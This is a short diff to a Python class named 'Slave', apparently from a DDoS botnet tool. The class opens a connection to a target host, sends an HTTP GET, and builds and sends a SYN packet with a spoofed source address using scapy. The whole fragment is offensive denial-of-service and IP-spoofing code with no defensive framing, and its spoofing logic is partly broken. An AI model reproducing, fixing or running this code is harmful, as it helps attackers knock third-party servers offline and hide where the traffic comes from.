@@ -49,12 +49,13 @@ class Slave():
             self.ddos.connect((host, port))
             self.ddos.send("GET /%s HTTP/1.1\r\n" % self.message)
             #IP Spoof
+            newSocket = scapy.StreamSocket(self.ddos)
             src = "10.1.1.3".format(random.randint(0,255))
-            spoofed_SYN =scapy.IP(dst=host,src=src)/scapy.TCP(dport=8080,sport=5000,flags='S')
+            spoofed_SYN =scapy.IP(dst=host,src=src)/scapy.TCP(dport=port,sport=22,flags='S', seq=10000)
             print spoofed_SYN
             # scapy.send(spoofed_SYN)
-            syn_ack= scapy.sr1(spoofed_SYN)
-            print syn_ack
+            # syn_ack= scapy.srp1(spoofed_SYN)
+            newSocket.send(spoofed_SYN)
         except error, msg:
             print error
             print msg
